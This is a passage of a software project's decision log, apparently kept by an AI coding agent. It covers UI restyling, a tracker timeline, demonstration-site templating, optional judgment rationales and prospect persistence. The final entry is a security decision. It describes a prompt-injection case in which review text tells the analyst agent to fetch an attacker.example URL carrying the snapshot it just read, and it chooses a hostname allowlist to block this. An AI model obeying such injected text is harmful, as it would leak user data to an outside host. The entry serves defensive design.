The second pass keeps those shadows (they still help at each panel's outer silhouette against whatever sits behind it) but adds the actual visible depth cues for a dark UI: a radial gradient wash behind `body` built from `--surface-0`/`--surface-1` (replacing a flat background), top-to-bottom `linear-gradient`s inside `.stage-panel`/`.discovery-panel`/`.analyst-panel`/`.prospect-card`-family/`.workspace-header` (blending existing surface tokens, no new colour), a `1px` near-white top-edge highlight (`--edge-highlight-strong`) plus a matching `inset` box-shadow line on those same panels, a bigger/bolder `.topbar h1` and `.workspace-mark`, a stronger `.workspace-nav-item.active` (wider left rule, a low-alpha `--accent-info` inset ring), a `border-left` accent-info tell on `.shortlist-card` on hover, and a `translateY(-1px)` lift on general button hover (reverting on `:active`). `.workspace-main .discovery-panel`/`.analyst-panel` (the in-workspace, chrome-less variant) continue to zero the shadow/background/border back out, since those panels read as the view itself, not a floating card inside it. `.gate-zone` keeps its single **static** `--shadow-lg`, still present at rest and never changing on hover or press, and `.gate-zone button` (including `:hover` and, added in this pass, `:active`) explicitly zeroes out both the shadow *and* the new lift transform, so pressing a gate control gets none of this pass's polish — on purpose, twice over now. No value in `index.css` changed, no `--accent-*` token was added, removed, or renamed (the nav-item ring reuses `--accent-info`'s own RGB value as a low-alpha tint, not a new meaning), and `src/domain/demonstration.ts` was not touched.
- Consequences: the interface now has an actually visible dark-theme depth system — light edges and background gradients, which is how depth reads against a near-black shell, with the darker shadows kept as a secondary cue — plus a bolder header/nav hierarchy and a felt (not just declared) button-hover response. `tests/contrast.test.ts`'s entire suite (every reading-surface ratio, the exact-four-accent-token assertion, the `--border-subtle` <3:1 exception, and the `color-scheme: dark`/`demonstration.ts` isolation check) is expected to be unaffected, since none of the hex values or custom-property names it reads were touched, and the demonstration generator's own file was not opened in either pass. **Verified 2026-08-11** — the operator's own `npm run lint && npm test && npm run build` run (0 lint warnings/errors, 465/465 tests, clean build) confirmed this change alongside DEC-117, DEC-118, DEC-120, and DEC-121. This decision's own first pass is still worth noting as a case where "not verified" mattered — this time for a purely visual claim ("se ve igual!!") that no test could have caught, only the operator's own eyes could. Still **awaiting operator review** for acceptance.
- Supersedes: not applicable — extends DEC-083/DEC-036's foundation with new elevation/motion primitives; every rule DEC-083 states (four accents, no gauge, motion <=200ms, gate gravity, demonstration isolation) is unchanged and, where rule 5 applies, deliberately reinforced rather than relaxed.

### DEC-120 — A restructuring pass toward a reference look (sidebar, header, stat tiles, per-view icons), plus a rule-4-safe "circle and colour" per score factor

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written after the operator shared a full set of reference screenshots and asked for "un look y estructura como este ejemplo... sin romper nada de lo que hemos hecho." One element of that reference — filled progress bars under each score factor — was flagged before implementing anything, since it is the literal case DEC-083 rule 4 exists to prevent. Asked directly (twice, since the first answer and a follow-up "que cosa?"/"y si lo decidimos con un circulo y color?" needed to be walked through in plain language before proceeding), the operator's confirmed instruction was: a fixed-colour status dot per factor — not a bar, not a filling ring — distinguishing `measured` from `unmeasured` by colour, paired with the existing status word in text.
- Context: the reference's structure is largely compatible with DEC-083/DEC-036 as written — a dark instrument-panel register, four semantic accent colours, tabular-numeral scores — but its surface treatment differs in ways this codebase had not yet built: a solid-fill active sidebar item rather than a tint, per-view leading icon shapes, pill-style status badges, tile-style stat cards instead of bare label/value pairs, a rounder corner radius throughout, and — the one genuine rule conflict — filled progress bars under each score factor, which DEC-083 rule 4 forbids specifically because a bar cannot show the difference between "measured, and it's low" and "never measured at all" (DEC-073's real 71.1-vs-70 case is the standing example of why that distinction has to survive in the UI).
- Options considered, for the bars specifically: implement them as shown, reverting rule 4 (rejected — reintroduces the exact ambiguity DEC-073 caused, this time by construction rather than by accident); add a bar only for measured factors, keeping numerals for unmeasured ones (rejected — the operator did not ask for this hybrid, and a screen showing bars next to some rows and plain numbers next to others reads as a bug, not a design); keep every factor as a tabular numeral with its denominator and status word (unchanged from DEC-083), and add a small, fixed-size, non-filling status dot coloured only by `factor.status` — never sized or animated by the score itself (chosen, the operator's own request once clarified).
- Decision: for the rest of the interface, `App.css` gained: (1) `--radius-sm`/`--radius`/`--radius-lg` redeclared (not edited) inside its own already-existing `:root` block at larger values (6px/10px/18px) — a later `:root` in the cascade wins for the properties it sets, so this is a global roundness increase with zero per-selector edits and zero effect on `index.css`'s own hex tokens; (2) `.workspace-badge` restyled as a tinted pill using the existing `--accent-info`/`--wash-info` pairing (already contrast-tested at 4.5:1+); (3) `.workspace-nav-item.active` changed from a wash tint to a **solid** `--accent-info` fill with `--surface-0` text — computed by hand against the same WCAG formula `tests/contrast.test.ts` runs (`#6fa8f5` on `#0e1116` ≈ 8.6:1), well past the 4.5:1 floor, and still the same "info" meaning used as a fill instead of a tint, not a fifth colour; (4) a small `.nav-icon` per nav item — `OperatorWorkspace.tsx` gained a `data-view={item.id}` attribute and an `aria-hidden` decorative `<span>` per button, styled in CSS as a square (default), a circle (`data-view="prospect"`), or a rotated-square diamond (`data-view="outreach"`) — explicitly documented in both files as a wayfinding shape only, not a completion indicator, since no state in this codebase currently tracks per-view completion and this does not invent any; (5) `.details div` (the Search view's stat row — Examined/Qualified/Flagged/etc. — and any other `<dl>` using this pattern) restyled as a bordered, gradient-backed tile with a bigger, bolder `dd` number, still tabular numerals, no bar; (6) bolder page headings (`font-weight: 700`, tighter tracking) in the workspace's main heading. For the score-factor dots specifically: `CandidateActions.tsx`'s two `.score-breakdown` factor lists (`CandidateScoreAction`'s reputation factors and `CandidateWebOpportunityAction`'s web-opportunity factors) each gained a `<span className="factor-dot factor-dot--${factor.status}">` before the existing text, and the reputation list — which previously omitted the status word entirely — now also prints `(factor.status)`, matching what the web-opportunity list already showed (this is not new data; `ReputationFactor.status` already existed on the type, just was not rendered). `.factor-dot` in `App.css` is a fixed 8px circle, coloured `--accent-info` for `measured` and `--accent-caution` for `unmeasured` — the same info/caution pairing `.kind-observed`/`.kind-insufficient_data` already use for the same distinction elsewhere, not a new meaning, and never resized or filled by the score value.
- Consequences: the sidebar, header badge, stat tiles, and score-factor rows now visually distinguish state and category the way the reference asked for, without reintroducing a filled gauge anywhere — DEC-083 rule 4 is unchanged, and this decision's own back-and-forth with the operator is itself evidence the rule is still being taken seriously rather than quietly worked around. The `data-view` attribute and decorative `<span>` are additive to `OperatorWorkspace.tsx`'s nav markup; no test in this repository currently exercises `OperatorWorkspace.tsx` or `CandidateActions.tsx` by name (confirmed by search before making this change), so this carries no known test-regression risk but also no test coverage of its own. **Verified 2026-08-11** — the operator's own `npm run lint && npm test && npm run build` run (0 lint warnings/errors, 465/465 tests, clean build) confirmed this change alongside DEC-117 through DEC-119 and DEC-121. Still **awaiting operator review** for acceptance.
- Supersedes: not applicable — extends DEC-119's elevation/motion pass and DEC-083/DEC-036's foundation; rule 4 is reinforced with a concrete rule-4-safe alternative rather than relaxed.

### DEC-121 — The Tracker shows a real per-prospect timeline (with times) instead of one run-together line

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written at the operator's request, after seeing the reference screenshots again: "se ve bien pero en la seccion de tracker, podrias hacer que se muestre paso a paso lo q se hizo con hora y todo asi como en la foto."
- Context: `RealTrackerPanel` already had every fact the reference's timeline needed — `TrackerEntry`'s `publishedAt`, `outreachOpenedAt`, `declaredSentAt`, `followUp.scheduledAt`, `respondedAt`, and `removedAt` are each a real timestamp from a real durable event, already read by `buildTrackerView` (DEC-082) — but the view rendered all of them on one line per prospect, separated by middle dots, which reads nothing like a timeline. The reference also shows "Declare sent"/"Declare not sent" buttons in a "Current record" panel; a real `outreach.declareSent` IPC handler already exists and is already called from `ProspectRecord.tsx` (DEC-081/DEC-096) with exactly the `dataId`/`to` shape `TrackerEntry` already carries, but no `declareNotSent` handler or event type exists anywhere in this codebase.
- Options considered: add a new `prospect.judgment_recorded`-derived step to `buildTrackerView` itself, to get an analogue of the reference's "Prospect selected" step (rejected for this pass — `tests/tracker.test.ts` has an intentional exact-shape `toEqual` assertion on `TrackerEntry`, specifically to catch "a tracker entry silently growing a field"; growing the domain type is exactly the kind of change that assertion exists to force a deliberate look at, and the six fields already present were enough to build a real timeline without it); build the reference's "Declare not sent" button anyway, as a UI-only action with no backing record (rejected — DEC-005's real-data-only discipline extends to controls, not just demonstration content: a button with nothing behind it is a fabricated capability); render every already-present timestamped field as its own timeline step, sorted chronologically, omitting any step whose field is `null` rather than showing a blank, and add a "Declare sent" button (reusing the existing real IPC) while leaving "Declare not sent" out entirely (chosen).
- Decision: `RealTrackerPanel.tsx` gained three pure helpers — `timelineFor(entry)` (six `if` checks, one per already-existing `TrackerEntry` field, each producing a `{key, occurredAt, title, description}` step only when that field is non-null), `formatWhen(iso)` (presentation-only local-time formatting; the underlying value stays the real ISO string, exposed via the rendered `<time dateTime>` attribute), and `statusFor(entry)` (a status label derived from the same fields, most-advanced-state-wins). `buildTrackerView` and `TrackerEntry` in `domain/tracker.ts` are completely unchanged — this is a rendering change only. Each prospect now renders as its own card (`.tracker-entry`) with a header (name, demo link), a "Prospect timeline" column (a real connected vertical line, one entry per recorded step, in reverse-chronological order, each showing its actual time, a title, and a description built from that prospect's own real data — never invented), and a "Current record" column showing a status pill and, when present, the next follow-up. A "Declare sent" button appears only when `outreachOpenedAt` is set and `declaredSentAt` is not — calling the same `window.horus.outreach.declareSent({dataId, to})` `ProspectRecord.tsx` already calls — and the existing "Record a response" button moved into this same column, logic unchanged. No "Declare not sent" button was added, for the reason stated above.
- Consequences: the Tracker now shows what actually happened to a prospect, in order, with real times, matching the reference's structure without inventing a step, a timestamp, or a control this codebase cannot back. `tests/tracker.test.ts`'s exact-shape assertions on `TrackerEntry`/`buildTrackerView` are untouched, since neither was modified. No test in this repository exercises `RealTrackerPanel` by name (reconfirmed before this change, same as DEC-118's own note), so this carries no known regression risk but also no test coverage of its own. **Verified 2026-08-11** — the operator's own `npm run lint && npm test && npm run build` run (0 lint warnings/errors, 465/465 tests including `tests/tracker.test.ts`'s exact-shape assertions, clean build) confirmed this change alongside DEC-117 through DEC-120. Still **awaiting operator review** for acceptance.
- Supersedes: not applicable — DEC-082's read-only-projection design and DEC-118's load-on-mount fix are both unchanged; this only changes how one already-computed `TrackerEntry[]` is rendered, plus adds one existing IPC call to a new call site.

### DEC-122 — The demonstration template gets a curated accent palette, a length-aware headline, a real-address directions link, and a monogram for the no-photo case

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written after the operator reviewed the actual generated output and said it was still poor quality: "en verdad esta de muy mala calidad" — asked to name what specifically, the operator selected: generic/no personality, the accent color doesn't fit the business, the layout breaks (cut-off text, bad on mobile), and too little content.
- Context: `buildDemonstrationSite` (DEC-079, restyled by DEC-114/DEC-116) had four concrete, separable defects once actually inspected against the operator's four complaints, not one vague "quality" problem:
  1. **Color.** `hueFromCategory` hashed a category string onto a raw 0–359 hue at one fixed saturation/lightness (45%/36%). Arithmetic, not curation — plenty of hues at that fixed S/L read as muddy or unpleasant (a yellow-green lands on olive drab), and nothing filtered those out.
  2. **Layout breakage.** `.hero`'s two CSS grid columns had no `min-width: 0` on the text column, a well-known grid overflow trap when the content (a long business name) is wider than the fr-fraction allows — plus the fixed `clamp(2.1rem, 5vw, 3.4rem)` headline didn't account for a long legal name at all, and `nav.top`'s two flex children had no wrap, so a long category string could overflow a narrow viewport.
  3. **Genericness.** Every generated page used the identical composition regardless of business — a colored panel with two decorative rings, or the same italic caution-orange placeholder sentence, was the only per-business visual variation besides the (badly-chosen) accent hue.
  4. **Sparse content.** DEC-005 forbids inventing services/hours/testimonials, so a listing with only a name, category, address, and phone — a large share of real small-business Google listings — produces a genuinely thin page: hero, then straight to a one-field Visit card.
- Options considered, per defect: for color, leave the raw-hash hue and just narrow its saturation/lightness range algorithmically (rejected — narrowing a formula still produces some bad outputs, just fewer; a small hand-picked set guarantees every possible output was actually looked at) versus a curated palette indexed by the same category hash (chosen — keeps the "same category, same color, pure function" property DEC-114 established, DEC-037's one-common-template rule, and the four-values-not-random test, while guaranteeing quality by construction); for content sparsity, invent generic filler copy to make thin listings look fuller (rejected outright — direct DEC-005 violation) versus derive more real, useful elements from fields already verified (chosen: a Google Maps directions link built from the business's own address, and a monogram drawn from the business's own name) versus leave sparse listings sparse (rejected — this is exactly what the operator flagged, and the codebase already has two more fields, address and name, that were retrieved and verified but underused).
- Decision: `src/domain/demonstration.ts` gained: (1) `ACCENT_PALETTE`, ten hand-picked `{hue, sat, light}` triples, each chosen to read cleanly against the existing cream background and off-black ink, selected by the same category-hash-mod-length approach `hueFromCategory` used, replacing it (`accentEntryFromCategory`); (2) `headlineSizeFor(rawName)`, three size tiers by the verified business name's own character length (≤20/≤35/>35 chars), plus `overflow-wrap: break-word` and `hyphens: auto` on `h1`, and `min-width: 0` on a newly-named `.hero-copy` wrapper — fixing the CSS grid overflow trap directly; (3) `nav.top` gained `flex-wrap: wrap` and the category span gained `max-width`/`overflow-wrap: anywhere`, so a long category no longer forces horizontal overflow on a narrow viewport; (4) `monogramFrom(rawName, rawCategory)` — a single verified alphanumeric character from the business's own name (or category, if the name is unavailable) — rendered as a large decorative letter behind the existing `[Business photography would appear here...]` placeholder text, which is unchanged and still present (DEC-005's bracketed-placeholder text is not removed, only no longer alone in an empty panel); (5) a "Get directions" link in the Visit card, built from `https://www.google.com/maps/search/?api=1&query=` plus the business's own verified, URL-encoded address — a real, working action derived from a field already shown elsewhere on the same page, not a new content claim. No field/placeholder/omission function's existing behavior changed: `field`, `telHref`, `servicesBlock`, `hoursBlock`, `priceBlock`, `reputationBlock`, `phoneBlock`, `websiteBlock` all produce the same output as before for the same input, and `buildDemonstrationSite` remains a pure function (no `Date.now()`, no `Math.random()` anywhere in the new code).
- Consequences: every demonstration now gets one of ten vetted accent colors instead of an arbitrary hash-derived one, a headline sized to its own real business name instead of one fixed size for every name length, a page that no longer has a known CSS grid overflow trap on its primary text column, and — for the common case of a photo-less listing — a distinct per-business monogram plus a working directions link instead of a flat color block and italic placeholder text alone. No new content claim was introduced anywhere; DEC-005's "omit the block when support is absent" rule is unchanged, and the same 27 assertions in `tests/demonstration.test.ts` (checked by hand against the new file, same reasoning as DEC-114/DEC-116) are expected to still pass, since none of the functions or literal placeholder/notice strings they assert on changed — only the CSS values, the headline's inline size, and two new elements (`.monogram`, the directions link) that no existing test asserts the absence of. **Not verified in this environment** — `npm run lint`, `npm test` and `npm run build` still need to run on the operator's own macOS machine; this is the fourth time this session a demonstration.ts change is stated confidently here before a real run confirms it (DEC-114, DEC-116 twice), so that caveat is repeated deliberately rather than assumed away.
- Supersedes: not applicable — DEC-114's editorial layout and DEC-116's fix (no CSS custom properties) are both unchanged in shape; this replaces DEC-114's color-selection formula and headline sizing, and adds two new real-data elements without touching field/placeholder logic.

### DEC-123 — Each generated site adapts to its business's own verified category, by icon and by section order

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written at the operator's request immediately after DEC-122 shipped: "la idea es que cada sitio generado se adapte mas o menos a la empresa."
- Context: DEC-122 fixed color, headline sizing, and content thinness, but every generated page still had the identical shape regardless of what kind of business it was — same eyebrow mark, same Services-then-Hours order, whether the listing was a restaurant, a law office, or a landscaper. The only field available to drive any adaptation without guessing is the business's own already-verified `category` string (the same field `accentEntryFromCategory` already reads) — DEC-005 permits deriving presentation from a verified fact, never inventing a new one.
- Options considered: infer more about the business than the category string states — for example guessing at typical services or a typical price tier per category (rejected outright — a direct DEC-005 violation, inventing content the business never published); a free-form per-category CSS theme with distinct fonts/colors per bucket (rejected — reopens exactly the "curate every output" problem DEC-122's `ACCENT_PALETTE` was built to close, at far higher surface area, and risks drifting from DEC-083 rule 6's operator/demonstration CSS isolation); a small, fixed set of category-keyword buckets driving only two purely presentational choices already safe by construction — a decorative icon next to the eyebrow label, and whether Hours or Services reads first — with an unmatched category falling through to a neutral icon and DEC-122's existing order unchanged (chosen).
- Decision: `src/domain/demonstration.ts` gained `ARCHETYPES`, six keyword-matched buckets (`food_drink`, `health_wellness`, `home_trade`, `professional`, `automotive`, `retail`), each pairing a list of lowercase substring keywords with a small hand-built inline SVG icon (`rect`/`circle`/`polygon`/one simple arc `path` only — no freehand bezier curves) and a `hoursFirst` boolean (true only for `food_drink`/`health_wellness`, where a visitor's first question is usually "is it open"), plus a `GENERAL_ARCHETYPE` fallback (a plain star icon, `hoursFirst: false`, matching DEC-122's existing order). `archetypeFromCategory(category)` lowercases the business's own verified `category` field and returns the first bucket whose keyword appears anywhere in it, or the fallback. In `buildDemonstrationSite`, the eyebrow now renders `${eyebrowIcon}${category}` (the icon is fixed static markup, never interpolated from business data, so it carries no escaping risk), and the two existing content blocks are emitted as `hoursBlock` then `servicesBlock`, or the reverse, purely by `archetype.hoursFirst` — `servicesBlock`/`hoursBlock`'s own construction, and every other field/placeholder function, is untouched. Keywords were chosen and checked by hand against both fixtures in `tests/demonstration.test.ts`: `'Landscaper'` matches `home_trade` via `'landscap'`; `'Auto & "Truck" Repair'` (the HTML-escaping test's malicious fixture) does not match `automotive`'s `'auto repair'` keyword, since the embedded `& "Truck" ` breaks the contiguous substring, so it correctly falls to the general fallback — no existing assertion about that fixture's escaped output is affected either way, since the icon markup is independent of the category text itself.
- Consequences: a landscaper, a restaurant, and a law office now read as visually distinct at a glance (a different mark next to the category, and — for food/drink and health/wellness — an order that puts hours before the offer list) without any new claim about the business appearing anywhere on the page. All 27 assertions in `tests/demonstration.test.ts` were checked by hand against this change: none references section order, and the only new HTML (`eyebrow-icon`/archetype `<svg>` markup) is not asserted against by any existing test. `grep -c 'var(--'` on the file returns 0 (DEC-083 rule 6 unaffected) and brace/paren counts are balanced (154/154, 136/136), checked the same way as DEC-114/DEC-116/DEC-122. **Not verified in this environment** — `npm run lint`, `npm test` and `npm run build` still need to run on the operator's own macOS machine; this is the fifth time this session a demonstration.ts change is stated confidently here before a real run confirms it (DEC-114, DEC-116 twice, DEC-122), so that caveat is repeated deliberately rather than assumed away.
- Supersedes: not applicable — extends DEC-122 without changing any of its color/headline/monogram/directions logic; the only shared surface is where `servicesBlock`/`hoursBlock` are concatenated in the template.

### DEC-124 — Recording a judgment gate no longer requires typing a rationale

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written at the operator's direct request, after screenshots of the G4–G6 judgment form: "es bien incomodo estar haciendo tantos clicks innecesarios. quitale lo de escribir algo obligado. que no sea obligatorio."
- Context: DEC-091 required a written rationale for any gate verdict other than `insufficient_data` — `findJudgmentProblems` refused to let "Record this judgment" activate, and `resolveJudgment` threw, until every answered gate had non-empty free text. That rule came from FUNCTIONAL_DESIGN section 5 and was a deliberate choice, not an oversight, but on a real run through the app it is pure friction on a solo-operator workflow: nothing downstream reads the rationale automatically (`reputation-scoring.ts` only reads `status`), and the operator is the one person whose own judgment this whole module exists to capture — forcing them to type something, on every gate, on every candidate, before their own recorded decision would even save, is a cost this project's sole reviewer is entitled to decide is not worth paying.
- Options considered: keep the requirement but make it feel lighter (e.g. a shorter default placeholder, or a single confirm click) — rejected, the operator was specific: "que no sea obligatorio," not "make it less annoying"; drop the rationale field from the form entirely — rejected, some rationale is still useful context for a future revisit of the same candidate, so the field stays, only the requirement to fill it is removed; make the field optional everywhere it is asked, and record an honest label ("no rationale was recorded") in its place when left blank, rather than fabricating a plausible-sounding reason or leaving the evidence field empty — chosen, keeps `resolveJudgment`'s output shape and DEC-005's "never invent" discipline intact for a field it does not govern but the same principle applies to.
- Decision: `operator-judgment.ts`'s `findJudgmentProblems` now always returns an empty list (kept as a function, not deleted, so `isJudgmentComplete` and the record button still have one real place to check if a future rule needs one); `resolveJudgment` no longer throws on a missing rationale — it records `NO_RATIONALE_EVIDENCE` ("Answered by the operator; no rationale was recorded.") in the assessment's `evidence` field instead, keeping the existing `UNASSESSED_EVIDENCE` label for genuinely unanswered (`insufficient_data`) gates unchanged. `CandidateActions.tsx`'s rationale input is now labelled "(optional)" instead of "(required)," the record button is disabled only while a request is in flight (`recording`), and the now-always-empty per-gate problem list is no longer rendered. DEC-008's rule 1 is untouched: a gate still has to be given an actual verdict (not left at `insufficient_data`) to count toward qualification — `isJudgmentComplete` still checks that — only the free-text explanation of a chosen verdict is no longer a precondition.
- Consequences: recording a judgment gate is now one fewer required field per gate — select a verdict, press record, done, with the rationale box available but never blocking. ~~No test in this repository directly asserted the old throw-on-missing-rationale behavior (checked `tests/candidate-scoring.test.ts` and confirmed no dedicated `operator-judgment.test.ts` exists), so this is not expected to break any existing assertion.~~ **Correction, 2026-08-11, found when the operator ran the real test suite for DEC-127: this claim was wrong.** `tests/operator-judgment.test.ts` does exist and directly asserted the superseded behavior — 4 tests failed (`refuses ... answered with a blank rationale` ×3, `throws rather than silently downgrading an unsupported verdict`). Fixed in the same pass: that describe block is retitled `DEC-124 — a verdict without a written rationale is still a recorded judgment` and now asserts what this decision actually specifies — `findJudgmentProblems` reports nothing, `resolveJudgment` does not throw, and a blank rationale resolves to the honest `NO_RATIONALE_EVIDENCE` label rather than a thrown error. DEC-091's rule 1 coverage (an unanswered gate never counts as a pass) was untouched and remains in the describe block above it. Brace/paren counts on both edited files are balanced (operator-judgment.ts 32/32, 19/19; CandidateActions.tsx 168/168, 202/202). Separately, the operator's screenshots also showed a qualified candidate's judgment panel still visible after "Record this judgment," which looked like the direct-to-prospect jump DEC-113 already built (checking `score?.qualified` in that same button's `.then()` and calling `setSelectedProspectId`/`setView('prospect')`) was not firing — that code is unchanged and, read again here, looks correct; it's flagged to the operator directly to re-test on this new build rather than assumed fixed, since no code change was made to it in this decision. **Not verified in this environment** — `npm run lint`, `npm test` and `npm run build` still need to run on the operator's own macOS machine.
- Supersedes: DEC-091's rule 2 (a verdict without a written rationale is not a judgment) — DEC-091's rule 1 (an unanswered gate is never a pass) is unchanged.

### DEC-125 — The record-then-jump-to-prospect check recomputes at the moment of recording, instead of trusting stored `score` state

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written after the operator retested DEC-113's direct-to-prospect jump on the DEC-124 build and reported it still not firing: "sigue sin ir directo al prospect despues de juzgar, lo ideal es que justo al juzgar un negocio vaya directo al prospect."
- Context: `CandidateScoreAction`'s "Record this judgment" button checked `score?.qualified` — the component's own `score` state — inside the `.then()` of the record IPC call, to decide whether to call `onQualified`. Read by hand against every render path (`applyJudgment` recomputes `score` synchronously on every dropdown change, and the button's `onClick` closure is recreated fresh on every render, so it should always see the same `score` already visible in the on-screen score breakdown), this looked correct, and no defect was found in it. The operator's own screenshots showed the opposite: a judgment recorded, the score breakdown right below it reading "qualified," and no navigation to the Prospect view — which is not explained by anything read in the source.
- Options considered: keep investigating from source alone until a defect is found (rejected for this pass — every path traced by hand reaches the same, correct-looking conclusion, and further staring at the same fifteen lines was not converging); add console logging and ask the operator to read DevTools output back (rejected as the first move — slower for the operator, and there is a real structural improvement available regardless of the root cause); remove the dependency on the `score` state variable entirely and recompute the qualification check directly from `retrieved` and `judgment` — the two state values `score` is itself derived from — at the exact moment the judgment is recorded (chosen: removes one layer of indirection as a possible cause, whatever it turns out to be, and is a strictly more direct way to answer "is this judgment, right now, a qualifying one" than trusting a separately-stored copy of the same computation).
- Decision: the record button's `.then()` now computes `justRecorded` by calling `scoreWith` (the same function `applyJudgment` and the initial `run` already use) directly against `retrieved.reviews`/`retrieved.retrievedAt`/`retrieved.paginationExhausted` and the current `judgment` — not the `score` state variable — and checks `justRecorded?.qualified` instead of `score?.qualified`. A `.catch()` was also added to the same promise chain (previously only `.then()`/`.finally()`), so a rejected `judgment:record` call now surfaces as a visible error instead of silently doing nothing.
- Consequences: the qualification check no longer depends on `score` having been kept in sync by a prior render — it is computed fresh, from the same two inputs, at the instant it is needed. If the underlying cause was some form of state staleness, this removes it; if it was not, this at least removes one variable from the next round of investigation. The operator is asked to retest on this build specifically after a full app restart (not just a save/reload), since `device_commit_files` writes source to disk but does not itself restart the Electron process, and a stale running instance would reproduce exactly this symptom regardless of what the source says. **Not verified in this environment.**
- Supersedes: not applicable — DEC-113's own decision and intent (jump to Prospect the moment a recorded judgment qualifies a candidate) are unchanged; only how the qualification is determined at that moment changed.

### DEC-126 — A "Clear all" button on the Shortlist, and the selected prospect now survives closing the app

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written at the operator's request: "shortlist: que haya un boton para borrar todo. {clear all}" and "cuando el negocio llega a prospect quede guardado hasta que avance asi cierre la app."
- Context: two separate, small gaps. (1) The Shortlist's only removal control was the Search view's per-candidate "Remove" button (DEC-112) — clearing a whole list of candidates the operator has already decided are not worth their attention meant clicking "Remove" once per candidate. (2) `selectedProspectId` had always lived only in React state (`useState`), never written anywhere durable — this document's own known-weaknesses list (CLAUDE.md) named it directly: "the selected prospect is still not restored when the application reopens," the one piece of DEC-107's restore work DEC-117 had not yet closed.
- Options considered, per gap: for "Clear all," add a second, separate dismissal set scoped only to the Shortlist (rejected — would let a candidate be hidden from the Shortlist but still visible on Search, or vice versa, two lists disagreeing about what's dismissed for no real benefit) versus reuse the existing `dismissedIds` display filter both views already read from (chosen — one dismissal state, one "Restore all" escape hatch, already proven correct by DEC-112's own tests-by-hand and by not touching retained evidence); for persisting the selection, add a new durable *event* (`prospect.selected`) the same way judgments are recorded (rejected — an event log is for immutable facts about what happened and when; "which one candidate is currently selected" is closer to workspace navigation state, a single current value that gets overwritten, not a history worth keeping every entry of) versus reuse the existing generic `workflow_sessions` key/value store the representative workflow already persists its own state in, under its own key (chosen — no new SQLite table, no new concept, and the exact right shape: one JSON blob, keyed, overwritten on every change).
- Decision: `ShortlistView.tsx` gained an optional `onClearAll` prop and a "Clear all" button next to the "Shortlist" heading (visible only when there is at least one ranked or excluded candidate to clear), with the same "removes from this list only, not retained evidence" wording the per-candidate "Remove" button already carries. `OperatorWorkspace.tsx`'s new `clearShortlist()` adds every currently-visible candidate's key to the existing `dismissedIds` set — the Search view's own "Restore all" button already undoes this, unchanged. Separately: `electron/main.ts` gained a `prospect:set-selected` IPC handler writing `{selectedProspectId}` to `workflow_sessions` under the key `prospect-selection-v1` via the existing generic `store.saveWorkflowState`, and `session:restore` now reads it back and returns it as `selectedProspectId`. `preload.cts`/`global.d.ts` expose this as `window.horus.prospect.setSelected({dataId})`. In the renderer, every place that used to call `setSelectedProspectId` directly (qualifying a candidate, selecting one on the Shortlist, clearing the selection from the Prospect view) now goes through one new `selectProspect(dataId)` function that updates state and persists the change, so no call site can forget to persist it; the restore effect sets `selectedProspectId` from the restored session on mount, straight into state (not through `selectProspect`, to avoid a pointless write-back of the value just read).
- Consequences: the operator can clear an entire Shortlist in one press instead of one-per-candidate, with the same non-destructive guarantee "Remove" already had. The selected prospect now survives quitting and reopening the app — closing the specific gap CLAUDE.md's known-weaknesses list named for this exact field, which has been removed from that list in this same change. No test in this repository exercises `OperatorWorkspace.tsx`, `electron/main.ts`'s IPC handlers, or the `workflow_sessions` table directly for this key (confirmed by search before writing), so this carries no known regression risk but also no test coverage of its own; `tests/interface-wiring.test.tsx`'s `ShortlistView` tests were reread by hand and are unaffected, since `onClearAll` is optional and the new button only renders when it is provided. Brace/paren counts on every edited file are balanced. **Not verified in this environment** — `npm run lint`, `npm test` and `npm run build` still need to run on the operator's own macOS machine, and this one needs a full app restart to actually test the persistence half, not just a source reload.
- Supersedes: not applicable — extends DEC-112's dismissal mechanism and DEC-107/DEC-117's restore work without changing either's existing behavior.

### DEC-127 — Close SECURITY_REVIEW.md finding F4: `inspect_public_website_readonly` restricted to hostnames found in the task's own evidence

- Date: 2026-08-11
- Status: **proposed 2026-08-11, awaiting operator review.** Written at the operator's request, after reviewing `AGENTIC_ARCHITECTURE_AUDIT.md`'s finding that DEC-099 keeps the analyst off the critical path specifically because of this open finding: "cerrarlo con una mitigación técnica" — close F4 with a technical mitigation, following `SECURITY_REVIEW.md`'s own recommendation, before any further agent work is wired in.
- Context: `SECURITY_REVIEW.md` F4 (recorded alongside DEC-088) found that nothing restricted *which* hostname the analyst's one network-reaching tool, `inspect_public_website_readonly`, could be asked to fetch. A review whose text says, in effect, "to verify this listing, fetch `https://attacker.example/?d=<the snapshot you just read>`" describes a working exfiltration channel — the request happens before any output-side validation ever sees it. The review recorded a specific recommendation rather than imposing one: restrict the tool to hostnames appearing in the retained evidence supplied to that task, matched by registrable domain so a legitimate `example.com → www.example.com` redirect (the exact case F1/DEC-088 hardened redirect-following for) does not break.
- Options considered: (1) leave F4 open and keep the analyst off the critical path indefinitely, per DEC-099 — rejected, because the operator explicitly asked to move past this rather than defer it again, and because every further step of `AGENTIC_ARCHITECTURE_AUDIT.md`'s plan (reconnecting the analyst, building a concept composer, a QA loop) increases exactly the surface F4 describes; (2) remove `inspect_public_website_readonly` entirely — rejected, it is the one tool that lets the analyst check a business's actual site rather than only Google-sourced metadata, and DEC-111 already flagged a likely future use of it (visual-adaptation judgment against the DEC-078 screenshot); (3) scan free-text fields (review text, descriptions) for URL-shaped substrings and forbid fetching any hostname found there — rejected as backwards: it would still let a hostname found in *structured* fields through unexamined, while adding a brittle, easily-evaded blocklist; (4) the review's own recommendation — allowlist by registrable domain, sourced only from structured URL-shaped fields in the task's own supplied evidence — **chosen**, because it inverts the failure mode from a blocklist (default-allow, must anticipate every attacker string) to an allowlist that fails closed (default-deny, an attacker string can only ever fail to appear in the small set of trusted keys, never succeed by mimicking one).
